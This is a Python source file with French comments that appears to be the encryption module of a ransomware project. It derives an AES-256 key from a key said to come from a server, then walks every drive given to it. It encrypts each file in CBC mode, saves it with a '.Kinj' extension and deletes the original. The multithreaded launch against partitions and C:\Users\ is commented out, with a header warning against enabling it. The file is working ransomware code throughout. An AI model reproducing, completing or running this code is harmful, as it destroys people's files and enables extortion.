#[!!!!!] Par mesure de prudence ne decommenté pas le partie commenté du code, si le serveur est en marche et que
#        cet code est éxécuté, vous risqué d'endommagé votre ordinateur.

import os
import threading
from Crypto.Cipher import AES
from Crypto.Util import Padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class encryption_setup:
    def __init__(self, key, disk):
        self.encryption_key = key
        self.drive_list = disk

    # Cette fonction se charge de generé une clé de 256 bits à partir de la clé reçu du serveur
    def generate_key(self):
        salt = b'salt_'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000
        )
        key = kdf.derive(self.encryption_key.encode())
        return key

    # Cette fonction c'est la fonction principale qui va se chargé du chiffrement
    def AES_CBC_256(self, path, key):
        try:
            iv = os.urandom(16)
            with open(path, 'rb') as normal_file:
                normal_data = normal_file.read()
            if normal_data[:18] == b"kinjal_AES_CBC_256":
                pass
            else:
                cipher = AES.new(key, AES.MODE_CBC, iv)
                padding_data = Padding.pad(normal_data, 16)
                encrypted_data = cipher.encrypt(padding_data)
                with open(path + ".Kinj", 'wb') as encrypted_file:
                    encrypted_file.write(b"kinjal_AES_CBC_256" + encrypted_data + iv)
                os.remove(path)
        except:
            pass


    # Nous allons faire un parcours de tous les fichiers pour les chiffrés un après l'autre
    def start_encryption(self):
        enc_key = self.generate_key()
        def run(drive_disk):
            for disk in drive_disk:
                for path, dirs, files in os.walk(disk):
                    for file in files:
                        normal_path_file = os.path.join(path, file)
                        if normal_path_file[-5:] == ".Kinj":
                            continue
                        else:
                            self.AES_CBC_256(normal_path_file, enc_key)


        # Pour diminuer le temps de chiffrement de tous les fichiers, le chiffrement de chaques partions se fera dans un thread different
        # Dans notre cas nous lancons 3 threads si le nombre des partitions est superieur à 1 et 2 dans le cas contraire
        """disk_partition = self.drive_list
        out_path = ["C:\\Users\\"]
        if len(disk_partition) > 1:
            frst_path = disk_partition[:1]
            lst_path = disk_partition[1:]
            out_path_thread = threading.Thread(target=run, args=[out_path])
            frst_path_thread = threading.Thread(target=run, args=[frst_path])
            lst_path_thread = threading.Thread(target=run, args=[lst_path])
            out_path_thread.start()
            frst_path_thread.start()
            lst_path_thread.start()
            out_path_thread.join()
        else:
            disk_partition_thread = threading.Thread(target=run, args=[disk_partition])
            out_path_thread = threading.Thread(target=run, args=[out_path])
            #disk_partition_thread.start()
            out_path_thread.start()
            out_path_thread.join()"""